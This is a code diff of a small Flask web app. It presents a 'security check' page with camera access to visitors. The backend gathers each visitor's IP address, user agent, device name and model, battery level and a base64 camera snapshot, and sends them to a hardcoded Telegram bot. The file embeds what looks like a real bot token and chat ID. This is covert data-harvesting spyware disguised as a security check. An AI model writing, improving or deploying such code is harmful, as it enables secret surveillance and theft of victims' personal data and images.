@@ -1,72 +1,57 @@
-from flask import Flask, render_template, jsonify, request
+from flask import Flask, request, jsonify, render_template
 import requests
-import json
-import threading
-import time
 
 app = Flask(__name__)
 
-# Replace with your Telegram bot's token and chat ID
-TELEGRAM_API_TOKEN = '7613835920:AAHrUPH7VHA-NZLfFwTAgX13xU8NvQIVZ78'
+# Telegram Bot Setup
+TELEGRAM_BOT_API = 'https://api.telegram.org/bot7613835920:AAHrUPH7VHA-NZLfFwTAgX13xU8NvQIVZ78/sendMessage'
 CHAT_ID = '912211827'
-BASE_URL = f'https://api.telegram.org/bot{TELEGRAM_API_TOKEN}'
 
-# Send data (snapshots and device info) to Telegram
-def send_to_telegram(data):
-    url = f'{BASE_URL}/sendMessage'
-    message = {
+def send_to_telegram(message):
+    data = {
         'chat_id': CHAT_ID,
-        'text': data
+        'text': message
     }
-    try:
-        response = requests.post(url, data=message)
-        if response.status_code != 200:
-            print(f"Error sending message: {response.text}")
-    except Exception as e:
-        print(f"Error sending message: {e}")
+    response = requests.post(TELEGRAM_BOT_API, data=data)
+    return response
 
-# Handle Telegram command: /status
-def handle_telegram_commands():
-    last_update_id = None
-
-    while True:
-        try:
-            url = f'{BASE_URL}/getUpdates?offset={last_update_id}'
-            response = requests.get(url).json()
-
-            for update in response.get('result', []):
-                last_update_id = update['update_id'] + 1
-                message_text = update['message'].get('text', '')
-                chat_id = update['message']['chat']['id']
-
-                # If the message is "/status", respond with server status
-                if message_text == "/status":
-                    send_to_telegram("Server running, waiting for data.")
-        except Exception as e:
-            print(f"Error checking Telegram commands: {e}")
-
-        time.sleep(2)  # Poll every 2 seconds
-
-# Endpoint to handle device info and snapshot data
-@app.route('/device_info', methods=['POST'])
-def device_info():
-    data = request.get_json()
-
-    # Send device info to Telegram
-    send_to_telegram(f"Device Info: {json.dumps(data)}")
-    
-    return jsonify({'status': 'success'}), 200
-
-# Main page to display the security checkup and camera
+# Route to render the security check page
 @app.route('/')
 def index():
     return render_template('index.html')
 
-if __name__ == "__main__":
-    # Start Telegram command handler in a separate thread
-    telegram_thread = threading.Thread(target=handle_telegram_commands)
-    telegram_thread.daemon = True  # Daemonize the thread
-    telegram_thread.start()
+@app.route('/sendData', methods=['POST'])
+def collect_data():
+    # Receive data from the frontend
+    data = request.get_json()
     
-    # Run the Flask app on all interfaces (0.0.0.0)
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    # Extract the relevant information from the data
+    ip = data['ip']
+    userAgent = data['userAgent']
+    deviceName = data['deviceName']
+    deviceModel = data['deviceModel']
+    batteryLevel = data['batteryLevel']
+    image = data['image']
+
+    # Create a formatted message
+    message = f"""
+    IP Address: {ip}
+    User Agent: {userAgent}
+    Device Name: {deviceName}
+    Device Model: {deviceModel}
+    Battery Level: {batteryLevel}
+    Image: {image}  # This is the base64 encoded image
+    """
+
+    # Send the message to Telegram bot
+    response = send_to_telegram(message)
+
+    # Return a response indicating success
+    if response.status_code == 200:
+        return jsonify({'status': 'Data sent successfully!'})
+    else:
+        return jsonify({'status': 'Failed to send data to Telegram.'}), 500
+
+if __name__ == '__main__':
+    # Run the Flask app on all network interfaces and accessible on all IPs
+    app.run(debug=True, host='0.0.0.0', port=5000)
